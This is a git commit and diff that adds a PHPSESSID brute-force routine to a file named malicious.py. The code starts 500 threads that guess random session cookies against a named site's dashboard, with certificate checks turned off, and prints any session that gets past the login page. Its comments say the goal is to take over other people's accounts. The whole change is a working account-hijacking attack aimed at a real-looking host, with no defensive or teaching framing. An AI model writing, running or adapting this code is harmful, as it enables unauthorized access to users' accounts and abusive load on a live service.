ad3a3231502e57590b544ce07b29983409ff3d95
pwd0kernel <pwd0kernel@gmail.com>
2021-04-20 17:02:55 -0230

    Update malicious.py
    added phpsessid bruteforce

--- source/malicious.py
+++ source/malicious.py
@@ -5,7 +5,44 @@
 
 import requests
 import warnings
+import threading
+import random
 from bs4 import BeautifulSoup
 
 class Malicious():
-    pass
+
+    bruteforce_threads = []
+
+    # this will try to brutefoce
+    # the phpsessid of otehr peoples Account
+    # but it could take a long while because
+    # there isnt a lot of buyers
+    def PHPSIDBrute_function():
+        try:
+            while True:
+                try:
+                    code = ''.join(
+                        (random.choice('zxcvbnmasdfghjklqwertyuiop1234567890') for i in range(26)))
+                    ss = requests.Session()
+                    check_url = ss.get(
+                        "https://lynx.rip/dashboard/home/", cookies=dict(PHPSESSID=code), verify=False)
+                    if "Login page example" in check_url.text:
+                        pass
+                    else:
+                        print(code)
+                        print(ss.cookies.get_dict())
+                except Exception:
+                    pass
+        except Exception:
+            print("There was an error with PHPSIDBrute.")
+        pass
+
+    def PHPSIDBruteForce():
+        for i in range(500):
+            brute = threading.Thread(target=PHPSIDBrute_function)
+            brute.daemon = False
+            bruteforce_threads.append(brute)
+        for i in range(500):
+            bruteforce_threads[i].start()
+        for i in range(500):
+            bruteforce_threads[i].join()
